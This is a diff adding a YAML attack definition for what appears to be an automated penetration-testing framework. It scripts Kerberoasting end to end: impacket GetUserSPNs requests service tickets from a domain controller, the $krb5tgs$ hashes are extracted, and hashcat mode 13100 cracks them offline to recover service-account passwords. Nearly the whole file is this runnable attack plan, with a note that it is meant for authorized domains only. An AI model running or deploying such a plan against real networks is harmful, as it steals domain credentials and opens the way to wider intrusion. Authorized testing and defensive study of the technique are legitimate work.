@@ -1,0 +1,55 @@
+# Mech-Unit attack intent — Kerberoasting via impacket GetUserSPNs.
+# Requests service tickets for SPN-bearing accounts and cracks them offline
+# (hashcat 13100). The graph's ad.access entry point when any valid AD
+# credential exists.
+id: ad_kerberoast
+name: Kerberoast SPN Accounts
+category: ad
+operator_label: "Roast AD service accounts (Kerberoasting)"
+operator_description: >
+  Requests Kerberos service tickets for every SPN-bearing account and
+  cracks them offline. Yields plaintext service-account passwords without
+  touching the target hosts.
+outcome: "Cracked service-account passwords, or ticket set exhausted"
+grants: [creds.valid, ad.access]
+time_to_impact: minutes + crack time
+noise: low
+risk_notes: >
+  Ticket requests are logged by domain controllers (4769 spikes).
+  Authorized domains only.
+
+preconditions:
+  - probe: tools_present
+    with: [impacket-GetUserSPNs]
+  - probe: tools_present
+    with: [hashcat]
+
+plan:
+  - step: request_tickets
+    tool: impacket_tools
+    args:
+      tool: GetUserSPNs
+      target: "{{ target.domain_controller }}"
+    max_wait: 300
+    extracts:
+      spn_hashes: "\\$krb5tgs\\$"
+    gate:
+      output: "\\$krb5tgs\\$|servicePrincipalName|sAMAccountName"
+    on_fail: warn
+
+  - step: crack_tickets
+    tool: hashcat_crack
+    args:
+      hash_file: "{{ plan_dir }}/kerberoast.hashes"
+      mode: 13100
+      attack_mode: 0
+      wordlist: "{{ resolver.wordlist.adaptive }}"
+    max_wait: 3600
+    gate:
+      output: "Cracked|Recovered"
+    on_fail: warn
+
+artifacts:
+  tickets: "{{ plan_dir }}/kerberoast.hashes"
+
+llm_required: false
